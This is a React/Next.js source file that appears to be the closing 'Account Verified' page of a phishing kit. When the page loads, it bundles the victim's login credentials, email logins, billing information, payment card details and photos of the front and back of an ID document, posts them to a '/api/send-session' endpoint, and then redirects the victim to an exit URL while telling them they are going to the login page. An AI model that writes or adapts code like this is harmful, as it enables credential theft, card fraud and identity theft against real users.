import React, { useContext, useEffect } from "react";
import { Box, CircularProgress, Typography } from "@mui/material";
import { Wrapper } from "../components/Wrapper";
import axios from "axios";
import { DataContext } from "./_app";

interface VerifiedProps {}

const Verified: React.FC<VerifiedProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const sessionId = data.sessionId;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (sessionId) {
            formData.append(`sessionId`, sessionId);
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper title={`Account Verified`}>
      <Box>
        <CircularProgress size={80} thickness={2} />
      </Box>
      <Typography
        component={`p`}
        sx={{
          fontSize: `.875rem`,
          fontFamily: `Roboto,sans-serif`,
          fontWeight: 400,
          lineHeight: `1.25rem`,
          letterSpacing: `.0178571429em`,
          marginTop: `24px`,
          marginBottom: `16px`,
        }}
      >
        Please wait while we redirected to the login page.
      </Typography>
    </Wrapper>
  );
};

export default Verified;
